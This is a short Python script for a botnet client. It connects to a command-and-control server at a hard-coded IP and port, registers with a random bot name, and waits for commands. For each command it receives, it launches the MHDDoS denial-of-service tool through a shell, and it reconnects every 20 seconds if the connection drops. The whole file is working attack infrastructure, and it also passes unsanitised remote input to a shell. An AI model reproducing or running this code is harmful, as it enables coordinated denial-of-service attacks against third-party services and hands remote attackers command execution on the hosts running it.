#!/usr/bin/env python3

import sys
import asyncio
import time
import subprocess
import os
import uuid

CUR_DIR = os.path.dirname(os.path.realpath(__file__))
MHDDoS = os.sep + 'MHDDoS' + os.sep + 'start.py'
TEST_CNC = "10.11.45.53"
TEST_CNC_PORT = 9999

async def start_bot():
    bot_name = 'bot-' + str(uuid.uuid4())
    # change IP to cnc server
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(TEST_CNC, TEST_CNC_PORT),
                                                timeout=5)
    except asyncio.TimeoutError:
        print('connect timeout')
        return
    reg_cmd = f'register {bot_name}'
    writer.write(reg_cmd.encode())
    await writer.drain()
    print('Connected to C&C Server')
    while True:
        data = await reader.read(1024)
        if not data:
            break
        message = data.decode()
        print(f"Command received from C&C Server: {message}")
        attack_para = message.split(' ',1)[1]
        print(f'attack para: {attack_para}')
        attack_cmd = f'python3 {MHDDoS} {attack_para}'
        print(f'attack cmd: {attack_cmd}')
        result = subprocess.run(attack_cmd, shell=True, capture_output=True, text=True)
        print(f'result: {result.stdout}')

def main():
    while True:
        asyncio.run(start_bot())
        print('bot is disconected, will restart again')
        time.sleep(20)

if __name__ == "__main__":
    main()
